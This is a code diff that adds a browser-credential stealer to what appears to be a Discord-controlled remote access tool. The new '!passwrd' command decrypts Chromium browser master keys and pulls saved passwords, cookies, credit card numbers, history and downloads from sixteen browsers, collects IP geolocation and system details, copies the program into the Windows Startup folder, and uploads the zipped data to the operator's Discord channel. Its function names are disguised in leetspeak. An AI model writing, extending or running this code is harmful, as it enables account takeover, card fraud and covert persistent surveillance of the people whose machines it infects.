@@ -18,6 +18,18 @@ import ctypes
 from discord.ext.commands import Context
 import inspect
 from gtts import gTTS
+import base64
+import json
+import os
+import shutil
+import sqlite3
+from pathlib import Path
+from zipfile import ZipFile
+import platform
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+
+
 
 intents = discord.Intents.all()
 intents.all()
@@ -539,7 +551,276 @@ async def critproc(ctx):
         await ctx.channel.send("```Command can not be Exacutable...```")
 
 
-    
+def tree(path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
+    pipes = {
+        'space':  '    ',
+        'branch': '│   ',
+        'tee':    '├── ',
+        'last':   '└── ',
+    }
+
+    if prefix == '':
+        yield midfix_folder + path.name
+
+    contents = list(path.iterdir())
+    pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
+    for pointer, path in zip(pointers, contents):
+        if path.is_dir():
+            yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
+            extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
+            yield from tree(path, prefix=prefix+extension)
+        else:
+            yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
+
+def g35(INFO):
+    response = requests.get("https://ipinfo.io/json")
+    if response.status_code == 200:
+        data = response.json()
+        INFO.append(f"IP: {data['ip']}\nTimezone: {data['timezone']}\nCity: {data['city']}\nRegion: {data['region']}\nCountry: {data['country']}\nLoc: {data['loc']}\nOrg: {data['org']}\nPostal: {data['postal']}")
+
+def s4st7m(SYSTEM_INFO):
+    SYSTEM_INFO.append(f"Platform: {platform.platform()}\nVersion: {platform.version()}\nProcessor: {platform.processor()}\nMachine: {platform.machine()}\nNode: {platform.node()}")
+
+def st4art7u0():
+    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    if hasattr(sys, 'frozen'):
+        source_path = sys.executable
+    else:
+        source_path = sys.argv[0]
+
+    target_path = os.path.join(startup_path, os.path.basename(source_path))
+    if os.path.exists(target_path):
+        os.remove(target_path)
+
+    shutil.copy2(source_path, startup_path)
+
+def get_master_key(path: str) -> str:
+    if not os.path.exists(path):
+        return None
+
+    with open(path, "r", encoding="utf-8") as f:
+        c = f.read()
+        local_state = json.loads(c)
+
+    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = master_key[5:]
+    return CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+def decrypt_password(buff: bytes, master_key: bytes) -> str:
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    return decrypted_pass[:-16].decode()
+
+def g34_l0g1n_d474(path: str, profile: str, master_key: bytes, LOGINS):
+    login_db = os.path.join(path, profile, 'Login Data')
+    if not os.path.exists(login_db):
+        return
+
+    shutil.copy(login_db, 'login_db')
+    conn = sqlite3.connect('login_db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+    for row in cursor.fetchall():
+        if not row[0] or not row[1] or not row[2]:
+            continue
+
+        password = decrypt_password(row[2], master_key)
+        LOGINS.append(f'{row[0]}\t{row[1]}\t{password}')
+
+    conn.close()
+    os.remove('login_db')
+
+def g47_c00k13s(path: str, profile: str, master_key: bytes, COOKIES):
+    cookie_db = os.path.join(path, profile, 'Network', 'Cookies')
+    if not os.path.exists(cookie_db):
+        return
+
+    try:
+        shutil.copy(cookie_db, 'cookie_db')
+        conn = sqlite3.connect('cookie_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3]:
+                continue
+
+            cookie = decrypt_password(row[3], master_key)
+            COOKIES.append(f'{row[0]}\t{"FALSE" if row[4] == 0 else "TRUE"}\t{row[2]}\t{"FALSE" if row[0].startswith(".") else "TRUE"}\t{row[4]}\t{row[1]}\t{cookie}')
+
+        conn.close()
+        os.remove('cookie_db')
+    except PermissionError:
+        print(f"Permission denied: {cookie_db}")
+    except FileNotFoundError:
+        print("cookie_db not found")
+
+def g37_w36_h1570r7(path: str, profile: str, WEB_HISTORY):
+    web_history_db = os.path.join(path, profile, 'History')
+    if not os.path.exists(web_history_db):
+        return
+
+    shutil.copy(web_history_db, 'web_history_db')
+    conn = sqlite3.connect('web_history_db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT url, title, last_visit_time FROM urls')
+    for row in cursor.fetchall():
+        if not row[0] or not row[1] or not row[2]:
+            continue
+
+        WEB_HISTORY.append(f'{row[0]}\t{row[1]}\t{row[2]}')
+
+    conn.close()
+    os.remove('web_history_db')
+
+def g35_40wnl044s(path: str, profile: str, DOWNLOADS):
+    downloads_db = os.path.join(path, profile, 'History')
+    if not os.path.exists(downloads_db):
+        return
+
+    shutil.copy(downloads_db, 'downloads_db')
+    conn = sqlite3.connect('downloads_db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT tab_url, target_path FROM downloads')
+    for row in cursor.fetchall():
+        if not row[0] or not row[1]:
+            continue
+
+        DOWNLOADS.append(f'{row[0]}\t{row[1]}')
+
+    conn.close()
+    os.remove('downloads_db')
+
+def g34_3r341t_3434s(path: str, profile: str, master_key: bytes, CARDS):
+    cards_db = os.path.join(path, profile, 'Web Data')
+    if not os.path.exists(cards_db):
+        return
+
+    shutil.copy(cards_db, 'cards_db')
+    conn = sqlite3.connect('cards_db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+    for row in cursor.fetchall():
+        if not row[0] or not row[1] or not row[2] or not row[3]:
+            continue
+
+        card_number = decrypt_password(row[3], master_key)
+        CARDS.append(f'{row[0]}\t{row[1]}\t{row[2]}\t{card_number}\t{row[4]}')
+
+    conn.close()
+    os.remove('cards_db')
+
+def write_files(LOGINS, COOKIES, WEB_HISTORY, DOWNLOADS, INFO, SYSTEM_INFO, CARDS):
+    os.makedirs("dinner", exist_ok=True)
+    if LOGINS:
+        with open("dinner/logins.txt", "w", encoding="utf-8") as f:
+            f.write('\n'.join(str(x) for x in LOGINS))
+
+    if COOKIES:
+        with open("dinner/cookies.txt", "w", encoding="utf-8") as f:
+            f.write('\n'.join(str(x) for x in COOKIES))
+
+    if WEB_HISTORY:
+        with open("dinner/web_history.txt", "w", encoding="utf-8") as f:
+            f.write('\n'.join(str(x) for x in WEB_HISTORY))
+
+    if DOWNLOADS:
+        with open("dinner/downloads.txt", "w", encoding="utf-8") as f:
+            f.write('\n'.join(str(x) for x in DOWNLOADS))
+
+    if INFO:
+        with open("dinner/info.txt", "w", encoding="utf-8") as f:
+            f.write('\n'.join(str(x) for x in INFO))
+
+    if SYSTEM_INFO:
+        with open("dinner/system_info.txt", "w", encoding="utf-8") as f:
+            f.write('\n'.join(str(x) for x in SYSTEM_INFO))
+
+    if CARDS:
+        with open("dinner/cards.txt", "w", encoding="utf-8") as f:
+            f.write('\n'.join(str(x) for x in CARDS))
+
+    with ZipFile("dinner.zip", "w") as zipf:
+        for file in os.listdir("dinner"):
+            zipf.write(f"dinner/{file}", file)
+
+async def send_dinner(ctx):
+    dinner_zip_path = Path("dinner.zip")
+    with ZipFile(dinner_zip_path, 'w') as zipf:
+        for file_path in Path("dinner").rglob('*'):
+            zipf.write(file_path, file_path.relative_to("dinner"))
+
+    embed = discord.Embed(
+        title="Dinner",
+        description="```" + '\n'.join(tree(Path("dinner"))) + "```"
+    )
+
+    file = discord.File(dinner_zip_path, filename="dinner.zip")
+    await ctx.send(embed=embed, file=file)
+
+def clean():
+    shutil.rmtree("dinner")
+    os.remove("dinner.zip")
+
+@bot.command(name="passwrd")
+async def passwrd(ctx):
+    if control_channel(ctx):
+        LOGINS = []
+        COOKIES = []
+        WEB_HISTORY = []
+        DOWNLOADS = []
+        CARDS = []
+        INFO = []
+        SYSTEM_INFO = []
+
+        g35(INFO)
+        s4st7m(SYSTEM_INFO)
+        st4art7u0()
+
+        appdata = os.getenv('LOCALAPPDATA')
+        browsers = {
+            'amigo': appdata + '\\Amigo\\User Data',
+            'torch': appdata + '\\Torch\\User Data',
+            'kometa': appdata + '\\Kometa\\User Data',
+            'orbitum': appdata + '\\Orbitum\\User Data',
+            'cent-browser': appdata + '\\CentBrowser\\User Data',
+            '7star': appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': appdata + '\\Iridium\\User Data',
+        }
+        profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
+
+        for _, path in browsers.items():
+            if not os.path.exists(path):
+                continue
+
+            master_key = get_master_key(os.path.join(path, 'Local State'))
+            if not master_key:
+                continue
+
+            for profile in profiles:
+                if not os.path.exists(os.path.join(path, profile)):
+                    continue
+
+                g34_l0g1n_d474(path, profile, master_key, LOGINS)
+                g47_c00k13s(path, profile, master_key, COOKIES)
+                g37_w36_h1570r7(path, profile, WEB_HISTORY)
+                g35_40wnl044s(path, profile, DOWNLOADS)
+                g34_3r341t_3434s(path, profile, master_key, CARDS)
+
+        write_files(LOGINS, COOKIES, WEB_HISTORY, DOWNLOADS, INFO, SYSTEM_INFO, CARDS)
+        await send_dinner(ctx)
+        clean()
+        
 @bot.command(name="session")
 async def session(ctx, *args):
     if control_channel(ctx) == True:
@@ -601,6 +882,7 @@ async def helpmsg(ctx):
 !upload (file) : Upload a File.
 !website (website url) : Go to the Website.
 !session (session name) : Create a Session. (Need a restart to use.)
+!passwrd : Get Passwords & Accounts Cookies & Logins & Cards & Web History & Downloads & Info.
 DO NOT FORGET TO GIVE SECONDS OR NUMBERS!
     example usage : !ws 10 it will take 10 webcamshot for a second.
     example usage : !recordvoice 10 it will record the voice for 10 seconds.
